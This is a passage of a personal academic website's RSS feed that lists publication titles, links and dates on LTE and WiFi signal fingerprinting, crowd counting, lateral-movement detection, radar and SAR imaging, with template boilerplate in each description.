Supplementary notes can be added here, including [code, math, and images](https://wowchemy.com/docs/writing-markdown-latex/).
--></description></item><item><title>LTE Signal Fingerprinting Device-Free Passive Localization Robust to Environment Changes</title><link>https://www.peco602.com/publication/0060-lte-fingerprinting-device-free-robust/</link><pubDate>Sun, 25 Nov 2018 00:00:00 +0000</pubDate><guid>https://www.peco602.com/publication/0060-lte-fingerprinting-device-free-robust/</guid><description>&lt;!--
&lt;div class="alert alert-note">
&lt;div>
Click the &lt;em>Cite&lt;/em> button above to demo the feature to enable visitors to import publication metadata into their reference management software.
&lt;/div>
&lt;/div>
&lt;div class="alert alert-note">
&lt;div>
Create your slides in Markdown - click the &lt;em>Slides&lt;/em> button to check out the example.
&lt;/div>
&lt;/div>
Supplementary notes can be added here, including [code, math, and images](https://wowchemy.com/docs/writing-markdown-latex/).
--></description></item><item><title>CSI-based fingerprinting for indoor localization using LTE signals</title><link>https://www.peco602.com/publication/0050-csi-fingerprinting-indoor-lte/</link><pubDate>Fri, 27 Jul 2018 00:00:00 +0000</pubDate><guid>https://www.peco602.com/publication/0050-csi-fingerprinting-indoor-lte/</guid><description>&lt;!--
&lt;div class="alert alert-note">
&lt;div>
Click the &lt;em>Cite&lt;/em> button above to demo the feature to enable visitors to import publication metadata into their reference management software.
&lt;/div>
&lt;/div>
&lt;div class="alert alert-note">
&lt;div>
Create your slides in Markdown - click the &lt;em>Slides&lt;/em> button to check out the example.
&lt;/div>
&lt;/div>
Supplementary notes can be added here, including [code, math, and images](https://wowchemy.com/docs/writing-markdown-latex/).
--></description></item><item><title>LTE signal fingerprinting localization based on CSI</title><link>https://www.peco602.com/publication/0040-lte-fingerprinting-localization-csi/</link><pubDate>Sun, 01 Oct 2017 00:00:00 +0000</pubDate><guid>https://www.peco602.com/publication/0040-lte-fingerprinting-localization-csi/</guid><description>&lt;!--
&lt;div class="alert alert-note">
&lt;div>
Click the &lt;em>Cite&lt;/em> button above to demo the feature to enable visitors to import publication metadata into their reference management software.
&lt;/div>
&lt;/div>
&lt;div class="alert alert-note">
&lt;div>
Create your slides in Markdown - click the &lt;em>Slides&lt;/em> button to check out the example.
&lt;/div>
&lt;/div>
Supplementary notes can be added here, including [code, math, and images](https://wowchemy.com/docs/writing-markdown-latex/).
--></description></item><item><title>Trained-once device-free crowd counting and occupancy estimation using WiFi: A Doppler spectrum based approach</title><link>https://www.peco602.com/publication/0020-trained-once-doppler-spectrum/</link><pubDate>Mon, 17 Oct 2016 00:00:00 +0000</pubDate><guid>https://www.peco602.com/publication/0020-trained-once-doppler-spectrum/</guid><description>&lt;!--
&lt;div class="alert alert-note">
&lt;div>
Click the &lt;em>Cite&lt;/em> button above to demo the feature to enable visitors to import publication metadata into their reference management software.
&lt;/div>
&lt;/div>
&lt;div class="alert alert-note">
&lt;div>
Create your slides in Markdown - click the &lt;em>Slides&lt;/em> button to check out the example.
&lt;/div>
&lt;/div>
Supplementary notes can be added here, including [code, math, and images](https://wowchemy.com/docs/writing-markdown-latex/).
--></description></item><item><title>Advanced Widespread Behavioral Probes against Lateral Movements</title><link>https://www.peco602.com/publication/0010-advanced-behavioral-lateral-movement/</link><pubDate>Wed, 01 Jun 2016 00:00:00 +0000</pubDate><guid>https://www.peco602.com/publication/0010-advanced-behavioral-lateral-movement/</guid><description>&lt;!--
&lt;div class="alert alert-note">
&lt;div>
Click the &lt;em>Cite&lt;/em> button above to demo the feature to enable visitors to import publication metadata into their reference management software.
&lt;/div>
&lt;/div>
&lt;div class="alert alert-note">
&lt;div>
Create your slides in Markdown - click the &lt;em>Slides&lt;/em> button to check out the example.
&lt;/div>
&lt;/div>
Supplementary notes can be added here, including [code, math, and images](https://wowchemy.com/docs/writing-markdown-latex/).
--></description></item><item><title>Preliminary design of a small tracking RADAR for LEO space objects</title><link>https://www.peco602.com/publication/0030-preliminary-design-radar-leo/</link><pubDate>Fri, 04 Mar 2016 00:00:00 +0000</pubDate><guid>https://www.peco602.com/publication/0030-preliminary-design-radar-leo/</guid><description>&lt;!--
&lt;div class="alert alert-note">
&lt;div>
Click the &lt;em>Cite&lt;/em> button above to demo the feature to enable visitors to import publication metadata into their reference management software.
&lt;/div>
&lt;/div>
&lt;div class="alert alert-note">
&lt;div>
Create your slides in Markdown - click the &lt;em>Slides&lt;/em> button to check out the example.
&lt;/div>
&lt;/div>
Supplementary notes can be added here, including [code, math, and images](https://wowchemy.com/docs/writing-markdown-latex/).
--></description></item><item><title>Extracting compact information from image benchmarking tools: the SAR despeckling case</title><link>https://www.peco602.com/publication/0000-extracting-compact-sar-despeckling/</link><pubDate>Mon, 09 Sep 2013 00:00:00 +0000</pubDate><guid>https://www.peco602.com/publication/0000-extracting-compact-sar-despeckling/</guid><description>&lt;!--
&lt;div class="alert alert-note">
&lt;div>
Click the &lt;em>Cite&lt;/em> button above to demo the feature to enable visitors to import publication metadata into their reference management software.
&lt;/div>
&lt;/div>
&lt;div class="alert alert-note">
&lt;div>
Create your slides in Markdown - click the &lt;em>Slides&lt;/em> button to check out the example.
&lt;/div>
&lt;/div>
Supplementary notes can be added here, including [code, math, and images](https://wowchemy.com/docs/writing-markdown-latex/).
--></description></item><item><title/><link>https://www.peco602.com/admin/config.yml</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.peco602.com/admin/config.yml</guid><description/></item></channel></rss>